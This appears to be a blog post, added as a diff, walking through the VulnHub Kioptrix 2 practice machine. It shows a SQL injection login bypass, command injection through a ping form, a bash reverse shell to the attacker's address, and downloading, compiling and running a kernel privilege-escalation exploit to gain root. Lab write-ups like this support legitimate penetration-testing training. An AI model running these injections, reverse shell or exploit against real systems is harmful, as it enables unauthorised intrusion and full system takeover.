@@ -1,0 +1,51 @@
+---
+layout: post
+title: "Kioptrix 2"
+date: 2020-09-18 14:23:00 -0600
+categories: VulnHub OSCP
+tags: VulnHub
+---
+
+Same as Kioptrix 1, this is an entry level box from VulnHub, you can download it from [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/#download).
+
+## Enumeration
+
+Again we follow the same pattern as the Kioptrix 1 and run AutoRecon against the box once it is booted up and on the network. AutoRecon showed similar results to the first Kioptrix machine, going through the Nikto scans I didn't really see anything of interest. The website on port 80 happened to be hosting a login screen though I decided to manually take a poke.
+
+## SQL Injection
+
+Most login pages are backed by a database of some type so I decided to try poking at some SQL Injection. Turns out the login page was susceptible to a SQLI and I was able to gain access to the protected pages with a simple `' or 1=1#'
+
+![sqli.png](/assets/images/af04e7308718422b9a38da019a8a5b65.png)
+
+## Internal Enumeration
+
+Once we got to the internal page there was a form there to "ping a machine on the network", entering the loopback we get output that looks exactly like the ping terminal utility. This means they are probably calling shell commands directly from the web interface and we can try to get command injection.
+
+![ping.png](/assets/images/0ad2948625e5434188cef9ef36b593c3.png)
+
+We can try testing command injection with either a ';' or '&&'. The ';' means to perform an additional command after the first command and '&&' means to perform an additional command if the first one succeeds. So let's trying running a simple command after the ping command.
+
+![whoami.png](/assets/images/d3086b5184a94a34b30f0e7a91767b71.png)
+
+We can see from the screenshot that the whoami command ran after the ping command and we are running as the apache user. Let's use our ability to chain commands to get a shell on the machine. We can use the following bash command to get a shell back '127.0.0.1; bash -i >& /dev/tcp/192.168.1.209/1122 0>&1', but first we need to open a listener on our Kali machine with 'nc -nvlp 1122'. Once we have our listener and we inject our command from above and send it, it will look like the command hung but if we check our nc command we will see that we have a terminal.
+
+![hostname.png](/assets/images/f1780a654f4c467f81614e99224de429.png)
+
+## Host Enumeration
+
+Doing some quick enumeration on the host, we can see what our current kernel and distro are by running 'uname -r' and 'cat /etc/\*-release'.
+
+![version.png](/assets/images/5864eca3d42943a6a859756ac8710a03.png)
+
+From this we can see that we are running kernel 2.6.9-55.EL on CentOS 4.5, we can feed this information into SearchSploit and see if we can find anything. I usually grep for Priv in my SearchSploit searches to narrow it down even more, if we search for 'Linux Kernel CentOS' we get the following results back.
+
+![searchsploit.png](/assets/images/eb260591535045d6893385b7b3544733.png)
+
+We can see that this machine appears to be vulnerable to the sock_sendpage() exploit which is fairly common to see on older machines. This exploit is provided to us as raw C code so we will need to compile it before we can use it. First we transfer it to our working directory with 'searchsploit -m 9545', this will copy the code for that exploit to our current working directory. Once we have it there we can start a python HTTP server to get the file onto our target machine, we can do that with 'python -m SimpleHTTPServer 8080'.
+
+Once the python server is running we can download it onto our target with 'wget http://192.168.1.209:8080/9545.c'. This will download the exploit code through our Python web server. Then we can compile it with 'gcc -o exploit 9545.c'. This will give us our compiled code that we can add the execute attribute to with 'chmod +x exploit' and run with ''./exploit'.
+
+![root.png](/assets/images/c636303ec26f417e8a5f90f434246f4a.png)
+
+Quite a bit to take in in that screenshot but we can see us switching to the /tmp directory so we are somewhere writable, downloading our exploit code, compiling it and running it. Running the exploit in this case is a success and we can see that we are now the root user.
